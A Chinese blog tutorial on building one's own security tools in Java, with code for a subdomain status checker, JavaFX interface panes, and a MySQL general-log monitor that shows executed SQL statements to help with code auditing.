    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>前些日子跟个大佬搞攻防，看着大佬超神我超鬼，不得不佩服大佬，看着大佬用的很多工具都没见过，问了下这些工具是啥，大佬掏出了他的大宝贝给我看，嚯，好家伙，一整个文件夹都是自己开发的工具还有一些魔改的工具，属实羡慕，看着大佬那些工具，陷入沉思，是不是我也可以有自己的武器库🤨总不能当伸手党吧，而且还能熟悉语言，增强自己在代码审计那块的。刚好之前搞过一段时间的开发，对于开发一些工具啥的还是有自己的想法的，说干就干，这个系列是写安全小白怎么从零开始拥有自己的一个工具库的文章，在开发方面我也是菜鸟，所以可能有些工具的开发思路跟那些流行的工具思路可能不一样，有哪写得不好的地方，希望大佬们能带带我。</p>
<span id="more"></span>

<h1 id="二、前期准备"><a href="#二、前期准备" class="headerlink" title="二、前期准备"></a>二、前期准备</h1><h2 id="2-1语言选择"><a href="#2-1语言选择" class="headerlink" title="2.1语言选择"></a>2.1语言选择</h2><p>开发工具嘛，肯定要会一两个语言，相信各位大佬肯定掌握了不止三四种的语言，小弟没啥能力，只掌握了C，java，python，php，go这几种，用来开发工具的话比较常见的就是java，python，go了，我比较熟悉那个java和python，而且一些常见的工具也是用的java和python来开发的，这两种语言的区别就不介绍了，大家都懂的，选择哪种主要看个人的需求，如果想省点事的话可以用python，里面的库用到才知道香，但是python虚拟机没有java强，毕竟java虚拟机是java的核心，而且python是全动态性的，可以在运行时自己修改自己的代码，java只能通过变通方法实现。python的变量是动态的，而java的变量是静态的，需要事先声明，所以java ide的代码提示功能优于python ide。</p>
<p>用java开发工具的话主要是习惯了用java开发有界面的工具，而python的话主要是因为库强大，可以少写很多东西，省很多时间，当然不是说python没办法搞界面，python是推出了一些框架用于开发界面的，其中最常用的就是一个是Django，Django是一个较为高级的Python Web框架，以快速开发和实用简洁的设计闻名，关于语言的选择还是看个人习惯吧，没有谁好谁坏的说法。</p>
<h2 id="2-2编译器"><a href="#2-2编译器" class="headerlink" title="2.2编译器"></a>2.2编译器</h2><p>java用的编译器是IDEA和eclipse，python用的是PyCharm，这几个都是很不错的编译器，就是有些只能试用或者找破解，下完编译器，先建个项目，这边拿eclipse做下示范，进来先建个项目，这边选的是1.8.0的，然后把名字命名一下，搞一个com.AX.Database_listening，然后直接finish。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220102525498.png" alt="image-20211220102525498"></p>
<p>搞完建好了，先看下目录结构SRC是我们之后写代码的地方，然后JRE这块是我们导入的包，事先有导入别的包，所以创建完之后会直接存在。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220112758035.png" alt="image-20211220112758035"></p>
<p>一般我们在开发的时候都会用到别人写好的东西，而有些是需要你导入的，我们下载完别人的jar之后，在自己项目下面创建一个lib，把我们下载好的jar拉进去，然后右键项目，点击Properties，然后选择Java Build Path</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220103338819.png" alt="image-20211220103338819"></p>
<p>找到你刚刚拉进来的jar，选中添加，然后保存，整个流程就结束了，这样我们在写其他功能的时候就会方便很多了。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220112652185.png" alt="image-20211220112652185"></p>
<p>然后可以开始写你自己代码了。</p>
<h2 id="2-3语言能力"><a href="#2-3语言能力" class="headerlink" title="2.3语言能力"></a>2.3语言能力</h2><p>语言和编译器选完了，就该有人问了，我这语言得掌握到啥程度才能开发自己的工具，嚯，要问这话我也不知道该怎么回，毕竟我自己学的也不是很深，就JAVA来说，如果你接受过系统的学习的话，基本上都会在学完基础语法之后进入到线程，异常，文件访问，接口，继承等等这些知识，后面可能会学到例如网络通信协议的东西让你写一些通信的小demo，当然要会到什么程度才能开发自己的工具的话，看你个人的需求，我觉得基本上只要你会基础语法，知道函数，类，子类，父类，重写，继承啥的就可以自己去开发一些工具了。</p>
<p>如果你的工具只是针对于本地的东西的话，你只需了解你想要实现的原理，后面根据这个原理去设计你的开发架构，那你压根不需要用到什么网络通信协议啥的，但是如果你需要对接网络上的一些资源的话，那么通信协议还是得会的，当然，这些对百度工程师是例外的，把你想要实现的去百度上搜索，基本上都会有解答，百度能实现百分之99的困难。</p>
<h2 id="2-4开发思路"><a href="#2-4开发思路" class="headerlink" title="2.4开发思路"></a>2.4开发思路</h2><p>不管是开发啥，你对成果一定要有个大概的框架，不一定要先想好界面，但是功能，要实现怎样的功能，这些功能能实现什么样的效果，以及如何去实现这些功能。大部分工具开发的流程都是一致的，基本上都是三部分：</p>
<ol>
<li>数据获取：怎么获取你想要的数据，例如怎么和网站进行通信，怎么连接数据库，怎么获取数据库的数据等等</li>
<li>数据处理：拿到数据之后，如何对数据进行处理，获取到你想要的那部分数据，一般我们在数据获取的的时候，是没办法直接获取到你想要的那部分数据的，基本上都是一锅端回来，然后根据显示出来的数据情况进行筛选，过滤，还有一种情况就是你获取到的数据需要进一步的处理，例如你获取回来的数据需要再进行一轮的数据分析，或者与你现有的特征进行比对等等这些情况，所以在数据获取和数据处理这两个方面是开发工具的时候最难的地方。</li>
<li>数据显示：如果前面数据获取和数据处理都完成了，那么就来到了最简单的地方，怎么呈现你的结果，是命令行还是界面，这个取决于个人喜好。</li>
</ol>
<p>所以，根据这三个部分基本上能满足你开发大部分的工具，而且你在开发这些工具的时候思路会很清晰，始终清楚自己在哪一部分，在哪一部分就干哪一部分的事情，找那块的解决方法，网上会有很多教程，其实工具就类似是拼图，你这找一下怎么实现，那找一下怎么实现，然后拼接起来，就成了工具，一句话，CCV，一把梭哈，冲就完事了。这里附下小弟我搞小工具的时候常规的思维导图。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211127004010265.png" alt="image-20211127004010265"></p>
<h1 id="三、开发过程"><a href="#三、开发过程" class="headerlink" title="三、开发过程"></a>三、开发过程</h1><p>这里如果空讲的话会有点空泛，我用我之前搞的一个小工具来做例子吧，直接说我自己开发这个工具的时候的一个开发思路会比较好一点，这是个子域名的一个探测工具，主要功能的话就是根据你输入的域名进行子域名的探测，然后根据页面的状态剔除那些无法访问的，把可以访问的留下来保存数据，这个是我后面用来采集页面样本然后做页面分类的，所以还有其他功能，这里我主要讲下如何探测子域名状态值的设计思路和开发过程。</p>
<h2 id="3-1开发架构"><a href="#3-1开发架构" class="headerlink" title="3.1开发架构"></a>3.1开发架构</h2><p>架构的话根据三个流程来准备，然后搞个思维导图（虽然也没啥必要，但是可以让后面自己的思路清晰，不会跑偏）</p>
<ol>
<li>数据获取：怎么通过域名连接到网站，然后获取到网站的状态值</li>
<li>数据处理：获取完数据之后怎么处理数据，将数据整理成我想要的格式，例如，域名，IP，开放端口，网站状态这样，把有用的数据单独拿出来</li>
<li>数据显示：数据处理完之后通过界面显示出收集的结果，然后把数据导出来，通过固定格式保存，方便之后的操作。</li>
</ol>
<p>贴下思维导图，这里只写了探测网站状态值那部分，其他的功能都差不多的，每个人的思路会有所不同，所以这块没啥大问题。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211128180018515.png" alt="image-20211128180018515"></p>
<h2 id="3-2实现目标"><a href="#3-2实现目标" class="headerlink" title="3.2实现目标"></a>3.2实现目标</h2><h3 id="3-2-1获取网站状态值"><a href="#3-2-1获取网站状态值" class="headerlink" title="3.2.1获取网站状态值"></a>3.2.1获取网站状态值</h3><p>如何获取网站状态值在上面的思维导图上面已经写了，通过java的uConnection.getResponseCode()可以获取状态码。进而判断该网站是否存在，具体代码怎么用以及返回的值，类型可以自己百度一下，我这里贴一下关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL u = <span class="keyword">new</span> URL(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">	HttpURLConnection uConnection = (HttpURLConnection)u.openConnection();  </span><br><span class="line">	<span class="keyword">try</span> &#123;  </span><br><span class="line">		uConnection.connect();</span><br><span class="line">		System.out.println(uConnection.getResponseCode());  </span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">			e.printStackTrace();  </span><br><span class="line">		&#125;                    </span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">			e.printStackTrace();  </span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>上面就是一个简单的通过url去连接网站，获取它返回的状态值，然后输出状态值，因为这里是连接的<a href="http://www.baidu.com,所以返回的是200,这个你们可以直接拿去运行看看内容,这个就是简单的一个实现过程,然后后面的可以把自己的字典导进去,获取你字典的数据,拼接到.baidu.com前面,再弄个多线程让他一直探测下去获取返回的值就行了./">www.baidu.com，所以返回的是200，这个你们可以直接拿去运行看看内容，这个就是简单的一个实现过程，然后后面的可以把自己的字典导进去，获取你字典的数据，拼接到.baidu.com前面，再弄个多线程让他一直探测下去获取返回的值就行了。</a></p>
<h3 id="3-2-2筛选自己想要的数据"><a href="#3-2-2筛选自己想要的数据" class="headerlink" title="3.2.2筛选自己想要的数据"></a>3.2.2筛选自己想要的数据</h3><p>上面我们已经拿到了网站的状态值，那么我们可以根据返回的状态值去对数据进行判断是不是该存起来，一个if就能解决的事情了，如果你想根据状态值来分类的话搞个switch就行了，例如说我们想要过滤一些数据，用if去过滤这些数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!logres.equals(logsql) &amp;&amp; !logres.contains(<span class="string">&quot;/* mysql&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SHOW WARNINGS&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;select event_time,argument from%%&quot;</span>))</span><br><span class="line">Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------&quot;</span>+logres+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样虽然方便，但是当你想要过滤的数据过多的时候，就需要列很长的条件，这样就太麻烦了，这时候就需要用其他的一些技能，比如说把黑名单存到文档然后根据文档里的内容去进行拦截等其他方式。</p>
<h3 id="3-2-3界面实现"><a href="#3-2-3界面实现" class="headerlink" title="3.2.3界面实现"></a>3.2.3界面实现</h3><p>这里说下几个面板，这个算是JAVAFX里面比较常见的面板了，其实界面没什么，就跟HTML差不多，一个套一个，套娃来的，你只要提前想好你自己的数据想要显示的位置，然后去布置按钮位置，数据显示位置就行了。</p>
<ul>
<li>StackPane（堆叠面板）：节点按照被添加的顺序从左到右、从上到下显示。</li>
<li>FlowPane（流式面板 ）：节点在5个区域显示－上、下、左、右、中</li>
<li>GridPane（栅格面板）：节点以灵活的行列栅格形式排列，这个可以根据自己的安排去排列那些元素的位置(0,0),(0,1),(1,0)(1,1)这样</li>
<li>BorderPane（边界面板）：将节点有序地排列在一个水平行中。当节点到达面板边界时，不会折行显示。</li>
<li>Hbox、Vbox（盒式面板）：Hbox将节点有序地排列在一个垂直列中。当节点到达面板边界时，不会折行显示，Vbox将节点有序地排列在一个中。当节点到达面板边界时，不会折行显示。</li>
</ul>
<p>其实这个是很简单的面板介绍，基本上都是按这些面板去堆叠出来的，我这里贴一个简单的面板加按钮的示例代码，运行这个看的话可能会更理解点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">label = <span class="keyword">new</span> Label(<span class="string">&quot;累加计数 &quot;</span>+count);</span><br><span class="line">Button btnPush = <span class="keyword">new</span> Button (<span class="string">&quot;+1&quot;</span>);	</span><br><span class="line"><span class="comment">//设置一个label和button</span></span><br><span class="line">btnPush.setOnAction(<span class="keyword">this</span>::btnPushHandler);</span><br><span class="line"><span class="comment">//设置按钮的事件，点击按钮之后会发生什么事情</span></span><br><span class="line">FlowPane pane = <span class="keyword">new</span> FlowPane (btnPush,label);</span><br><span class="line"><span class="comment">//然后把按钮和label放到面板里面，这个是流式的，直接横着排列</span></span><br><span class="line">pane.setHgap(<span class="number">20</span>);</span><br><span class="line">pane.setAlignment(Pos.CENTER);</span><br><span class="line">Scene scene = <span class="keyword">new</span> Scene(pane, <span class="number">300</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//设置面板大小</span></span><br><span class="line">stage.setScene(scene);</span><br><span class="line">stage.setTitle(<span class="string">&quot;面板示例&quot;</span>);</span><br><span class="line"><span class="comment">//面板title</span></span><br><span class="line">stage.show();</span><br><span class="line"><span class="comment">//显示出来</span></span><br></pre></td></tr></table></figure>

<p>这个面板也完成了，当你把面板设计好之后，把你完成的代码分模块放到每个按钮的事件里面去，上面的那句btnPush.setOnAction(this::btnPbushHandler)是把btnPbushHandler事件设置到btnPush这个按钮里面去，当点击到btnPush按钮的时候，执行该事件，例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Connect_SQL = <span class="keyword">new</span> Button(<span class="string">&quot;连接数据库&quot;</span>);</span><br><span class="line"><span class="comment">//设置一个按钮叫Connect_SQL</span></span><br><span class="line">Connect_SQL.setOnAction(<span class="keyword">this</span>::ConnectSQL);</span><br><span class="line"><span class="comment">//点击该按钮之后执行ConnectSQL事件</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//编写ConnectSQL，当点击了该按钮之后执行ConnectSQL事件，去连接数据库</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConnectSQL</span><span class="params">(ActionEvent event)</span></span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	ConnectSQL.Connect(sql_addr.getText(), sql_port.getText(), sql_user.getText(), sql_password.getText());</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就把按钮和事件响应连接起来，设计相对应的按钮和事件，去达到自己想要实现的目标，基本上这个工具就完成了，当工具写完了之后，不可能每次都进编译器里面去运行吧，把它导出来成为一个.jar的文件，之后直接执行这个文件就行了。</p>
<p>右键项目，点击Export，选择jar file</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220112323902.png" alt="image-20211220112323902"></p>
<p>然后把自己的项目勾选上，直接finish，就完成了。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220112454283.png" alt="image-20211220112454283"></p>
<p>至此，整个工具的编写就完成了</p>
<h1 id="四、实战"><a href="#四、实战" class="headerlink" title="四、实战"></a>四、实战</h1><h2 id="4-1工具说明"><a href="#4-1工具说明" class="headerlink" title="4.1工具说明"></a>4.1工具说明</h2><p>一个Mysql监控工具的思路以及实现方式，实现了指定数据库名监控跟它有关的sql语句，单独显示特定的sql语句,刚开始自己用的那些网上的工具不是很理想，所以就打算自己写一个，目前只实现了这两个功能，后面会把它改成一个代审工具，实现从sql语句跳定位到代码啥的。</p>
<h2 id="4-2开发思路"><a href="#4-2开发思路" class="headerlink" title="4.2开发思路"></a>4.2开发思路</h2><p>工具的思路其实也很简单，主要就是这四块</p>
<ol>
<li>连接数据库</li>
<li>监听数据库日志</li>
<li>对数据库日志的数据进行过滤</li>
<li>显示数据</li>
</ol>
<p>而工具最终目标是：用户连接上数据库之后，在测试代码或者网站功能的时候，经过该工具过滤能够定位到执行的sql语句，方便进行代码审计</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/20211115165221-5892b92c-45f1-1-16407678891502.png" alt="image.png"></p>
<h2 id="4-3前期准备"><a href="#4-3前期准备" class="headerlink" title="4.3前期准备"></a>4.3前期准备</h2><ul>
<li>连接数据库实现</li>
<li>兼容不同的Mysql版本</li>
<li>监听数据库的方式</li>
<li>过滤脏数据</li>
<li>准确过滤出自己想要的语句</li>
</ul>
<h2 id="4-4目标实现"><a href="#4-4目标实现" class="headerlink" title="4.4目标实现"></a>4.4目标实现</h2><h3 id="4-4-1连接数据库"><a href="#4-4-1连接数据库" class="headerlink" title="4.4.1连接数据库"></a>4.4.1连接数据库</h3><h4 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h4><p>连接数据库我用的是JDBC去连接MySQL数据库，连接 MySQL的话需要 需要驱动包，最新版下载地址为：**<a href="http://dev.mysql.com/downloads/connector/j/**%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%90%8E%E5%BE%97%E5%88%B0">http://dev.mysql.com/downloads/connector/j/**，解压后得到</a> jar 库文件，然后在对应的项目中导入该库文件。要兼容版本的话得下两个jar，一个兼容8以上的，一个兼容以下的。</p>
<p>MySQL 8.0 以上版本的数据库连接部分不同：</p>
<p>MySQL 8.0 以上版本驱动包版本<a href="https://static.runoob.com/download/mysql-connector-java-8.0.16.jar">mysql-connector-java-8.0.16.jar</a>。</p>
<p>com.mysql.jdbc.Driver 更换为com.mysql.cj.jdbc.Driver。</p>
<p>MySQL 8.0以上版本无需建立SSL连接，需要显示关闭。</p>
<p>allowPublicKeyRetrieval=true 允许客户端从服务器获取密钥，最后还需要设置 CST</p>
<p>加载驱动与连接数据库方式如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/test_demo?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">MySQL <span class="number">8.0</span> 以下版本 - JDBC 驱动名及数据库 URL   </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>; </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String DB_URL = <span class="string">&quot;jdbc:mysql://[localhost:3306/RUNOOB](http://localhost:3306/RUNOOB)&quot;</span>;</span><br><span class="line"><span class="comment">// MySQL 8.0 以上版本 - JDBC 驱动名及数据库 URL    </span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>; </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String DB_URL = <span class="string">&quot;jdbc:mysql://[localhost:3306/RUNOOB?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC](http://localhost:3306/RUNOOB?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EventHandler&lt;ActionEvent&gt; <span class="title">Connect</span><span class="params">(String sql_addr, String sql_port, String sql_user,String sql_password)</span><span class="keyword">throws</span> ClassNotFoundException, SQLException  </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		USER = sql_user;</span><br><span class="line">		PASS = sql_password;</span><br><span class="line">		Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        	JDBC_DRIVER = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        	DB_URL = <span class="string">&quot;jdbc:mysql://&quot;</span> + sql_addr + <span class="string">&quot;:&quot;</span> + sql_port + <span class="string">&quot;/mysql?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=GMT%2B8&amp;useSSL=false&quot;</span>;</span><br><span class="line">        	 <span class="comment">// 注册 JDBC 驱动</span></span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            <span class="comment">// 打开链接</span></span><br><span class="line">            Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------正在连接数据库...&quot;</span>+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//            System.out.println(&quot;正在连接数据库...&quot;);</span></span><br><span class="line">            conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line">            conn.prepareStatement(<span class="string">&quot;SET global general_log=on&quot;</span>).executeUpdate();</span><br><span class="line">            conn.prepareStatement(<span class="string">&quot;SET GLOBAL log_output=&#x27;table&#x27;&quot;</span>).executeUpdate();</span><br><span class="line">            DatabaseMetaData metaData = (DatabaseMetaData) conn.getMetaData();</span><br><span class="line">            String version = metaData.getDatabaseProductVersion();<span class="comment">//得到数据库版本信息</span></span><br><span class="line"><span class="comment">//            System.out.println(time.format(Long.valueOf(System.currentTimeMillis()))+&quot;--当前数据库版本为：&quot;+version);</span></span><br><span class="line">            Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------当前数据库版本为：&quot;</span>+version+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">catch</span>(SQLException se)&#123;</span><br><span class="line">        </span><br><span class="line">            JDBC_DRIVER = <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        	DB_URL = <span class="string">&quot;jdbc:mysql://&quot;</span>+sql_addr+<span class="string">&quot;:&quot;</span>+sql_port+<span class="string">&quot;/mysql?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=GMT%2B8&amp;useSSL=false&quot;</span>;</span><br><span class="line">        	 <span class="comment">// 注册 JDBC 驱动</span></span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            <span class="comment">// 打开链接</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;正在连接数据库...&quot;);</span></span><br><span class="line">            Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------正在连接数据库...&quot;</span>+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line">            DatabaseMetaData metaData = (DatabaseMetaData) conn.getMetaData();</span><br><span class="line">            conn.prepareStatement(<span class="string">&quot;SET global general_log=on&quot;</span>).executeUpdate();</span><br><span class="line">            conn.prepareStatement(<span class="string">&quot;SET GLOBAL log_output=&#x27;table&#x27;&quot;</span>).executeUpdate();</span><br><span class="line">            String version = metaData.getDatabaseProductVersion();<span class="comment">//得到数据库版本信息</span></span><br><span class="line"><span class="comment">//            System.out.println(time.format(Long.valueOf(System.currentTimeMillis()))+&quot;--当前数据库版本为：&quot;+version);</span></span><br><span class="line">            Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------当前数据库版本为：&quot;</span>+version+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="comment">// 处理 Class.forName 错误</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-2监听数据库日志"><a href="#4-4-2监听数据库日志" class="headerlink" title="4.4.2监听数据库日志"></a>4.4.2监听数据库日志</h3><h4 id="监听思路"><a href="#监听思路" class="headerlink" title="监听思路"></a>监听思路</h4><p>刚开始想的是直接对某个数据库的日志进行监听，但是后面发现需要修改数据库的配置文件，不是很方便，毕竟不想每监听一个就去改一下这个数据库的配置文件(想偷懒),还有就是监听缓存文件以及监听mysql数据库里面的一个表，我想着之后有可能把它改成一个代码审计的工具，所以直接监听整mysql的日志，后面再对脏数据进行过滤就行了。</p>
<p>根据上面的思路，我直接对Mysql里的general_log表进行监听，但是后面发现有很多脏数据，而且因为这个是整个Mysql的所以那些数据库运行的数据也会显示出来，导致我后面过滤脏数据一度尴尬，为了验证可行性，直接用if去过滤那些无用的数据，后面改成黑名单，直接把那些脏数据加进去然后过滤了</p>
<h4 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String logsql = <span class="string">&quot;select * from mysql.general_log where command_type =\&quot;Query\&quot; OR command_type =\&quot;Execute\&quot; order by event_time desc limit 1,15&quot;</span>;</span><br><span class="line">	Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);</span><br><span class="line">	ResultSet rs = conn.prepareStatement(logsql).executeQuery();</span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">	String logres = rs.getString(<span class="string">&quot;argument&quot;</span>);</span><br><span class="line"><span class="comment">//System.out.println(time.format(Long.valueOf(System.currentTimeMillis()))+&quot;：&quot;+logres);</span></span><br><span class="line">	Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------&quot;</span>+logres+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>连接数据库，然后通过查询表内的数据，再不断输出，但是太多无用数据显示了，基本上每次都会显示SET NAMES utf8，SELECT @@session.autocommit，SHOW WARNINGS这些数据出来，太干扰看那些正常的语句了，所以我刚开始只是用了一层if去过滤这些数据，后面发现不大灵活，所以整成一个黑名单，可以动态添加删除拦截那些数据的规则。</p>
<h3 id="4-4-3过滤数据"><a href="#4-4-3过滤数据" class="headerlink" title="4.4.3过滤数据"></a>4.4.3过滤数据</h3><h4 id="过滤思路"><a href="#过滤思路" class="headerlink" title="过滤思路"></a>过滤思路</h4><p>刚开始获取的时候看到很多其他的数据来干扰，例如SELECT QUERY_ID，SHOW STATUS，SHOW FULL TABLES WHERE Table_type != ‘VIEW’这些，上面说到我用了个if去过滤那些带这个特征的数据，其实挺好用的，只不过后面想要动态的去调整这些黑名单，所以用了个下拉列表来存储数据，然后把数据过来只后再把下拉列表里面的数据进行处理，再把获取到的数据库信息一个个过滤掉，从而达到过滤的效果，</p>
<h4 id="关键代码-2"><a href="#关键代码-2" class="headerlink" title="关键代码"></a>关键代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!logres.equals(logsql) &amp;&amp; !logres.contains(<span class="string">&quot;/* mysql&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SHOW WARNINGS&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;select event_time,argument from%%&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SELECT STATE&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SHOW STATUS&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SELECT QUERY_ID&quot;</span>))&#123;</span><br><span class="line">     Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------&quot;</span>+logres+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

